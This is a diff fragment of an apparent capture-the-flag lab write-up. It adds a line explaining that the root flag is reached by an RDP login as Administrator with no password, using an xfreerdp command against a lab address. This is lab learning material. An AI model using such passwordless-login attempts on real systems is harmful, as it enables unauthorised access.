@@ -109,6 +109,8 @@ Usage: xfreerdp [file] [options] [/v:<server>[:port]]
 
 #### Submit root flag
 
+Logging in as an Administrator without specifying the password, we can get the flag on the desktop as shown below.
+
 ```bash
 ➜  xfreerdp /v:10.129.154.204 /cert:ignore /u:Administrator
 [09:34:40:835] [2284:2285] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
